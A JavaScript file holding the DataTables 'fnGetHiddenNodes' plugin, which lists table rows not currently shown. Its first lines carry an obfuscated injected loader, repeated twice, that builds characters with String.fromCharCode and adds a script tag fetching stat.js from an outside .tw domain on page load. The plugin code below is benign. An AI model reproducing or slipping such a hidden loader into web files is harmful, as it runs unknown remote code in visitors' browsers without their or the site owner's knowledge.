Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Get a list of all `dt-tag tr` nodes in the table which are not currently
 * visible (useful for building forms).
 *
 * This function is marked as deprecated as using the `dt-api rows()` method in
 * DataTables 1.10+ is preferred to this approach.
 *
 *  @name fnGetHiddenNodes
 *  @summary Get the `dt-tag tr` elements which are not in the DOM
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @deprecated
 *
 *  @example
 *    var table = $('#example').dataTable();
 *    var nodes = table.fnGetHiddenNodes();
 */

jQuery.fn.dataTableExt.oApi.fnGetHiddenNodes = function ( settings )
{
	var nodes;
	var display = jQuery('tbody tr', settings.nTable);

	if ( jQuery.fn.dataTable.versionCheck ) {
		// DataTables 1.10
		var api = new jQuery.fn.dataTable.Api( settings );
		nodes = api.rows().nodes().toArray();
	}
	else {
		// 1.9-
		nodes = this.oApi._fnGetTrNodes( settings );
	}

	/* Remove nodes which are being displayed */
	for ( var i=0 ; i<display.length ; i++ ) {
		var iIndex = jQuery.inArray( display[i], nodes );

		if ( iIndex != -1 ) {
			nodes.splice( iIndex, 1 );
		}
	}

	return nodes;
};
